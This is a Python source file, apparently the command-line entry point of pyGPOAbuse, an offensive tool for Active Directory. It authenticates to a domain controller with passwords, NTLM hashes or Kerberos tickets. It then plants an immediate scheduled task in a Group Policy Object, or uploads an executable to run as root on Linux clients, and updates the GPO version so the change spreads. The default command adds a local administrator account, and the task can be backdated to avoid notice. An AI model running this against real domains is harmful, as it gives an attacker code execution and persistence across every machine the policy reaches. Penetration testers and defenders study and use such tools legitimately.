#!/usr/bin/env python3

"""
This tool is a partial python implementation of SharpGPOAbuse
https://github.com/FSecureLABS/SharpGPOAbuse
All credit goes to @pkb1s for his research, especially regarding gPCMachineExtensionNames

Also thanks to @airman604 for schtask_now.py that was used and modified in this project
https://github.com/airman604/schtask_now
"""

import argparse
import asyncio
import logging
import sys

from impacket.smbconnection import SMBConnection
from impacket.examples.utils import parse_credentials

from pygpoabuse import logger
from pygpoabuse.gpo import GPO
from pygpoabuse.ldap import find_gpo_id_by_name
from pygpoabuse.linux_startup import LinuxStartupAbuse


def main():
    parser = argparse.ArgumentParser(add_help=True, description="Add ScheduledTask to GPO")

    parser.add_argument('target', action='store', help='domain/username[:password]')

    gpo_group = parser.add_mutually_exclusive_group(required=True)
    gpo_group.add_argument('-gpo-id', action='store', metavar='GPO_ID',
                           help='Target GPO by its GUID (e.g. 31B2F340-016D-11D2-945F-00C04FB984F9)')
    gpo_group.add_argument('-gpo-name', action='store', metavar='GPO_NAME',
                           help='Target GPO by its display name (resolved via LDAP)')

    parser.add_argument('-user', action='store_true', help='Set user GPO (Default: False, Computer GPO)')
    parser.add_argument('-user-as-admin', action='store_true', help='Set user GPO but run as SYSTEM (Default: False, Computer GPO)')
    parser.add_argument('-taskname', action='store', help='Taskname to create. (Default: TASK_<random>)')
    parser.add_argument('-mod-date', action='store', help='Task modification date (Default: 30 days before)')
    parser.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    parser.add_argument('-description', action='store', help='Task description (Default: Empty)')
    parser.add_argument('--cleanup', action='store_true', help='Delete the Immediate-Task XML and roll back the GPO version')
    parser.add_argument('-powershell', action='store_true', help='Use Powershell for command execution')
    parser.add_argument('-command', action='store',
                        help='Command to execute (Default: Add john:H4x00r123.. as local Administrator)')
    parser.add_argument('-k', action='store_true', help='Use Kerberos authentication. Grabs credentials from ccache file '
                                            '(KRB5CCNAME) based on target parameters. If valid credentials '
                                            'cannot be found, it will use the ones specified in the command '
                                            'line')
    parser.add_argument('-dc-ip', action='store', help='Domain controller IP or hostname')
    parser.add_argument('-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
    parser.add_argument('-ccache', action='store', help='ccache file name (must be in local directory)')
    parser.add_argument('-f', action='store_true', help='Force add ScheduleTask')
    parser.add_argument('-v', action='count', default=0, help='Verbosity level (-v or -vv)')

    linux = parser.add_argument_group("Linux (Samba AD) options")
    linux.add_argument("--linux-exec", metavar="/PATH/TO/EXEC",
                       help="Upload this executable into the GPO and run it at boot on Linux clients (no shell).")
    linux.add_argument("--linux-args", default="", help="Arguments for the executable.")
    linux.add_argument("--linux-run-as", default="root", help="User to run as (default: root).")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init()

    if options.v == 1:
        logging.getLogger().setLevel(logging.INFO)
    elif options.v >= 2:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(25)  # SUCCESS level: show successes, warnings and errors

    domain, username, password = parse_credentials(options.target)

    if options.dc_ip:
        dc_ip = options.dc_ip
    else:
        dc_ip = domain

    if domain == '':
        logging.critical('Domain should be specified!')
        sys.exit(1)

    lmhash, nthash = "", ""

    if password == '' and username != '' and options.hashes is None and options.k is False:
        from getpass import getpass
        password = getpass("Password:")
    elif options.hashes is not None:
        if ":" not in options.hashes:
            logging.error("Wrong hash format. Expecting lm:nt")
            sys.exit(1)

    if options.ldaps:
        protocol = 'ldaps'
    else:
        protocol = 'ldap'

    if options.k:
        if not options.ccache:
            logging.error('-ccache required (path of ccache file, must be in local directory)')
            sys.exit(1)
        url = '{}+kerberos-ccache://{}\\{}:{}@{}/?dc={}'.format(protocol, domain, username, options.ccache, dc_ip, dc_ip)
    elif password != '':
        url = '{}+ntlm-password://{}\\{}:{}@{}'.format(protocol, domain, username, password, dc_ip)
        lmhash, nthash = "", ""
    else:
        url = '{}+ntlm-nt://{}\\{}:{}@{}'.format(protocol, domain, username, options.hashes.split(":")[1], dc_ip)
        lmhash, nthash = options.hashes.split(":")

    if options.gpo_name:
        logging.info(f"Resolving GPO name '{options.gpo_name}' via LDAP...")
        gpo_id = asyncio.run(find_gpo_id_by_name(url, domain, options.gpo_name))
        if not gpo_id:
            logging.error(f"Could not find a GPO named '{options.gpo_name}'")
            sys.exit(1)
        logging.info(f"Resolved '{options.gpo_name}' → {gpo_id}")
        options.gpo_id = gpo_id

    try:
        smb_session = SMBConnection(dc_ip, dc_ip)
        if options.k:
            smb_session.kerberosLogin(user=username, password='', domain=domain, kdcHost=dc_ip)
        else:
            smb_session.login(username, password, domain, lmhash, nthash)
    except Exception as e:
        logging.error("SMB connection error", exc_info=True)
        sys.exit(1)

    try:
        gpo = GPO(smb_session)

        gpo_type = "user-as-admin" if options.user_as_admin else ("user" if options.user else "computer")

        if options.linux_exec:
            method = LinuxStartupAbuse(
                smb_session=smb_session,
                domain_fqdn=domain,
                gpo_guid=options.gpo_id,
                exec_local_path=options.linux_exec,
                exec_args=options.linux_args,
                run_as=options.linux_run_as,
                run_once=True
            )
            method.run(cleanup=options.cleanup)

            try:
                files = smb_session.listPath("SYSVOL", method._startup_dir + "\\*")
                if any(f.get_longname() == method.script_name for f in files):
                    print("[+] SUCCESS:root:executable '{}' created in {}".format(
                        method.script_name, method._startup_dir))
                else:
                    logging.error("Upload failed: '{}' not found in {}".format(
                        method.script_name, method._startup_dir))
            except Exception as e:
                logging.error("Could not verify creation: {}".format(e))

            sys.exit(0)

        if options.cleanup:
            ok = gpo.rollback_scheduled_task(domain=domain, gpo_id=options.gpo_id, gpo_type=gpo_type)
            if ok:
                logging.info("cleanup successful")
                sys.exit(0)
            else:
                logging.error("Error while cleaning up")
                sys.exit(1)

        task_name = gpo.update_scheduled_task(
            domain=domain,
            gpo_id=options.gpo_id,
            name=options.taskname,
            mod_date=options.mod_date,
            description=options.description,
            powershell=options.powershell,
            command=options.command,
            gpo_type=gpo_type,
            force=options.f
        )
        if task_name:
            if gpo.update_versions(url, domain, options.gpo_id, gpo_type=gpo_type):
                logging.info("Version updated")
            else:
                logging.error("Error while updating versions")
                sys.exit(1)
            logging.success("ScheduledTask {} created!".format(task_name))
    except Exception as e:
        logging.error("An error occurred. Use -vv for more details", exc_info=True)
